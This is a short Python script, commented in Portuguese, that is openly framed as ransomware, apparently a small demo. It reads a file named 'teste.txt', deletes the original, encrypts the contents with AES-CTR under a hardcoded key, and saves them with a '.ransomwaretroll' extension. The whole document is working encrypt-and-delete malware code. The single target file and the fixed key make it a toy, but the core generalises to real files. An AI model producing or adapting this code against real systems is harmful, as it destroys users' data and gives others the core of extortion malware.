import os
import pyaes

# Verificar se o arquivo existe antes de abrir
file_name = "teste.txt"
if os.path.exists(file_name):
    # Abrir o arquivo a ser criptografado
    with open(file_name, "rb") as file:
        file_data = file.read()

    # Remover o arquivo
    os.remove(file_name)

    # Chave de criptografia
    key = b"testeransomwares"
    aes = pyaes.AESModeOfOperationCTR(key)

    # Criptografar o arquivo
    crypto_data = aes.encrypt(file_data)

    # Salvar o arquivo criptografado
    new_file_name = file_name + ".ransomwaretroll"
    with open(new_file_name, 'wb') as new_file:
        new_file.write(crypto_data)
else:
    print(f"Arquivo {file_name} não encontrado.")